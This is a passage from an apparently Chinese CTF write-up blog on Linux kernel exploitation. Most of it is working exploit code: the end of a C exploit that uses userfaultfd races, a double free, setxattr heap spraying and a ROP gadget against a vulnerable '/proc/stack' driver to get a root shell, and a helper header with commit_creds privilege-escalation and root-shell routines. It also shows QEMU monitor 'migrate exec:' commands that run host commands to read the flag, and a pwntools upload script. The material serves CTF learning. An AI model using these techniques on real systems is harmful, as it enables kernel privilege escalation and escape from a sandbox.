class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>            <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>            <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>            <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span><br>            <span class="hljs-string">&quot;syscall&quot;</span><br>        );<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] back to userland successfully!&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] uid: %d gid: %d\n&quot;</span>, <span class="hljs-built_in">getuid</span>(), <span class="hljs-built_in">getgid</span>());<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] execve root shell now...&quot;</span>);<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x57AC0001</span>, data) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;push!&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x57AC0002</span>, data) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;pop!&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">size_t</span>      data[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">char</span>        *uffd_buf_leak;<br>    <span class="hljs-type">char</span>        *uffd_buf_uaf;<br>    <span class="hljs-type">char</span>        *uffd_buf_hack;<br>    <span class="hljs-type">int</span>         pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         shm_id;<br>    <span class="hljs-type">char</span>        *shm_addr;<br><br>    dev_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/stack&quot;</span>, O_RDWR);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    page_size = <span class="hljs-built_in">sysconf</span>(_SC_PAGE_SIZE);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>        <span class="hljs-keyword">if</span> ((seq_fd_reserve[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;seq reserve!&quot;</span>);<br>    <br>    uffd_buf_leak = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">registerUserFaultFd</span>(uffd_buf_leak, page_size, leak_thread);<br><br>    shm_id = <span class="hljs-built_in">shmget</span>(<span class="hljs-number">114514</span>, <span class="hljs-number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);<br>    <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;shmget!&quot;</span>);<br>    shm_addr = <span class="hljs-built_in">shmat</span>(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (shm_addr &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;shmat!&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">shmdt</span>(shm_addr) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;shmdt!&quot;</span>);<br><br>    <span class="hljs-built_in">push</span>(uffd_buf_leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);<br><br>    uffd_buf_uaf = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">registerUserFaultFd</span>(uffd_buf_uaf, page_size, double_free_thread);<br>    <span class="hljs-built_in">push</span>(<span class="hljs-string">&quot;7c00&quot;</span>);<br>    <span class="hljs-built_in">pop</span>(uffd_buf_uaf);<br><br>    uffd_buf_hack = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, page_size * <span class="hljs-number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">registerUserFaultFd</span>(uffd_buf_hack + page_size, page_size, hijack_thread);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset);<br>    *(<span class="hljs-type">size_t</span> *)(uffd_buf_hack + page_size - <span class="hljs-number">8</span>) = <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset;<br><br>    seq_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">setxattr</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-string">&quot;7c00&quot;</span>, uffd_buf_hack + page_size - <span class="hljs-number">8</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>kernelpwn.h</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">void</span> * kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_api</span> uffdio_api;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_register</span> uffdio_register;<br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = <span class="hljs-built_in">syscall</span>(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = <span class="hljs-built_in">pthread_create</span>(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-built_in">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_struct</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_driver</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">serial_icounter_struct</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_operations</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_struct</span> * (*lookup)(<span class="hljs-keyword">struct</span> tty_driver *driver,<br>            <span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">int</span> idx);<br>    <span class="hljs-built_in">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-built_in">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-built_in">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-built_in">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-built_in">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-built_in">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-built_in">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-built_in">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-built_in">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-built_in">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span class="hljs-built_in">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-built_in">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-built_in">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> set, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-built_in">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-built_in">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);<br>    <span class="hljs-built_in">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-built_in">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-built_in">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-built_in">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-built_in">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span> *proc_fops;<br>&#125;;<br><br><br><br></code></pre></td></tr></table></figure>

<h2 id="一些小trick"><a href="#一些小trick" class="headerlink" title="一些小trick"></a>一些小trick</h2><h4 id="没有使用-monitor-x2F-dev-x2F-null将monitor重定向"><a href="#没有使用-monitor-x2F-dev-x2F-null将monitor重定向" class="headerlink" title="没有使用-monitor &#x2F;dev&#x2F;null将monitor重定向"></a>没有使用-monitor &#x2F;dev&#x2F;null将monitor重定向</h4><p>没有使用-monitor &#x2F;dev&#x2F;null将monitor重定向，可以直接进入monitor导出docker中的文件系统</p>
<p>在启动qemu后点击ctrl+a后再按c即可进入monitor控制台</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">migrate</span> <span class="hljs-string">&quot;exec:cp rootfs.cpio /tmp&quot;</span><br>migrate <span class="hljs-string">&quot;exec:cd /tmp;ls 1&gt;&amp;2&quot;</span><br>migrate <span class="hljs-string">&quot;exec:cd /tmp;cpio -idmv &lt; rootfs.cpio 1&gt;&amp;2&quot;</span><br>migrate <span class="hljs-string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="发送exp脚本"><a href="#发送exp脚本" class="headerlink" title="发送exp脚本"></a>发送exp脚本</h4><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>cmd = <span class="hljs-string">&#x27;/ $ &#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./start.sh&#x27;</span>)<br>def exploit(r):<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;stty -echo&#x27;</span>)<br>    #os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;musl-gcc  -static -O2 exp.c -o exp&#x27;</span>)<br>    os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tar -cvf exp.tar.gz exp&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;cat &lt;&lt;EOF &gt; /tmp/exp.tar.gz.b64&#x27;</span>) #heredoc<br>    r.sendline((read(<span class="hljs-string">&#x27;exp.tar.gz&#x27;</span>)).encode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>    #r.sendline(<span class="hljs-string">&#x27;EOF&#x27;</span>)<br>    # r.recvall()<br>    # r.sendline(<span class="hljs-string">&#x27;cd /tmp/&#x27;</span>)<br>    #r.recv()<br>    # r.sendlineafter(cmd, <span class="hljs-string">&#x27;base64 -d /tmp/exp.tar.gz.b64 &gt; /tmp/exp.tar.gz&#x27;</span>)<br>    # r.sendlineafter(cmd, <span class="hljs-string">&#x27;tar -xvf /tmp/exp.tar.gz -C /tmp/&#x27;</span>)<br>    # r.sendlineafter(cmd, <span class="hljs-string">&#x27;chmod +x /tmp/exp&#x27;</span>)<br>    # r.sendlineafter(cmd, <span class="hljs-string">&#x27;/tmp/exp&#x27;</span>)<br>    # r.sendlineafter(cmd, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br>    r.interactive()<br><br>exploit(p)<br></code></pre></td></tr></table></figure>
<p>自己手动填入添加注释的这几条语句，否则有可能会出错。有可能根目录下没有创建新文件的权限，所以最好在&#x2F;tmp&#x2F;目录下创建。</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/01/06/ORW%E7%9A%84%E5%87%A0%E7%A7%8D%E5%81%9A%E6%B3%95/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ORW的几种做法</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/07/11/house-of-einherjar/">
                        <span class="hidden-mobile">house_of_einherjar</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    
      <script>
        Fluid.utils.loadComments('#disqus_thread', function() {
          Fluid.utils.createCssLink('https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css');
          Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', function() {
            new DisqusJS({
              shortname: 'fluid',
              apikey: 'trwJbYJPGKH4bdh85sXdS48SP31zB23YSlzfcGF5d5zq6t7doF29K8cai9KWxlix'
            });
          });
        });
      </script>
    
    <noscript>Please enable JavaScript to view the comments</noscript>
  </div>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
